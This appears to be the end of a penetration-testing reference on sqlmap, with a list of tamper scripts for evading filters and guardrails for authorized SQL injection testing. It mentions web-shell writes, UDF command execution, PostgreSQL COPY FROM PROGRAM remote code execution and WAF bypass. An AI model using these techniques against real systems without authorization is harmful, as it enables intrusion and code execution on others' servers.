| `uppercase.py` | All keywords UPPERCASE |
| `varnish.py` | Append `X-originating-IP` header |
| `versionedkeywords.py` | MySQL versioned comment around keywords |
| `versionedmorekeywords.py` | Extended versioned comments |
| `xforwardedfor.py` | Append `X-Forwarded-For` header |

---

## Hard Guardrails

1. **Authorization first** — no SQLi testing without explicit written permission.
2. **Use `--batch`** — non-interactive mode prevents accidental credential changes.
3. **`--risk=3 --level=5`** — enables all injection points but increases request count.
4. **`--threads`** — max 5 on production, 10+ acceptable on staging.
5. **`--time-sec`** — increase to 11+ on slow targets to avoid false negatives.
6. **Rate limit** — 200ms minimum between requests; use `--delay` for WAF-protected targets.
7. **Evidence-based** — every SQLi finding needs: full HTTP request, response excerpt, and reproduction steps.
8. **File write** — requires `FILE` privileges and known webroot; never write shells to production without operator approval.
9. **UDF execution** — requires root MySQL + `lib_mysqludf_sys.so` installed; verify with `whereis` first.
10. **CVE-2019-9193** — PostgreSQL `COPY FROM PROGRAM` is RCE; requires superuser; always verify version (9.5–11.2 affected).
11. **Stacked queries** — only work with certain DB drivers; PHP+MySQL does not support stacked queries by default.
12. **WAF bypass** — try whitespace alternatives before tamper scripts; DBMS-specific hex characters are often more effective.
